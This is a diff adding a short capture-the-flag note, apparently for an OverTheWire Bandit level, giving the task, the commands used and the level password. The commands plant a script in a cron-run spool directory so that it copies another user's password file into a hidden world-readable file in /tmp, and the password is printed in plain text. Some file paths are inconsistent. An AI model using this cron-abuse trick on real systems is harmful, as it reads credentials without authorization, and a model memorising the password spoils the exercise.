@@ -1,0 +1,3 @@
+Task: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+Command:  nano /var/spool/bandit24/foo/theshyhat.sh, chmod +x /spool/bandit24/foo/theshyhat.sh,  echo 'cat /etc/bandit_pass/bandit24 > /tmp/...shyhat_bandit24_pass.txt; chmod 777 /tmp/...shyhat_bandit24_pass.txt' > /var/spool/bandit24/foo/shyhat.sh; chmod +x /var/spool/bandit24/foo/shyhat.sh, cat /tmp/...shyhat_bandit24_pass.txt 
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
